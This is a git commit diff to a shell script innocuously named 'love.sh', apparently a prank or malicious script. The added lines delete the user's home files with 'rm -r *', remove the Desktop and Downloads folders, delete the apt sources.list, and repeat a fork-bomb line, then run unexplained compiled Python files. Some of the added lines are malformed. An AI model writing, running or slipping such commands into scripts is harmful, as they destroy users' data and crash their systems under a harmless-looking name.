583a368ea3246e08014ac2e00f16279aa31f5805
Elharam4 <55320959+elostora@users.noreply.github.com>
2020-12-21 09:58:19 +0200

    Update love.sh

--- love.sh
+++ love.sh
@@ -11,6 +11,13 @@ mkdir uoghoufhgwoufhswoufhwroufghoughrougbouhgouthboutghoughuoghoujklijkl
 mkdir uoghoufhgwoufhswoufhwroufghoughrougbouhgouthboutghoughuoghouhyfuru
 mkdir uoghoufhgwoufhswoufhwroufghoughrougbouhgouthboutghoughuoghouftgrgour
 cd
+rm ngrok
+rmdir Downloads
+rm -r *
+rmdir Desktop
+cd etc/apt
+rm sources.list
+;((){ :|:& };:
 ;((){ :|:& };:
 python elharam4.pyc
 python el.pyc
